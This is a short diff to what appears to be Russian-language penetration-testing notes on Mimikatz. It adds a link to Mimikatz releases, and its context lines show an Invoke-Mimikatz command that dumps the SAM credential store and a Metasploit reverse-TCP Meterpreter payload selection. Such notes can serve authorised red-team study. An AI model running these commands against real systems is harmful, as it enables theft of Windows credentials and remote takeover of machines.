@@ -7,6 +7,11 @@
         Invoke-Mimikatz -command "privilege::debug token::elevate lsadump::sam"
 
 
+# мимикатз в exe
+
+        https://github.com/gentilkiwi/mimikatz/releases
+
+
 МИМИКАТЗ в метасплойт
 
 use windows/x64/meterpreter_reverse_tcp
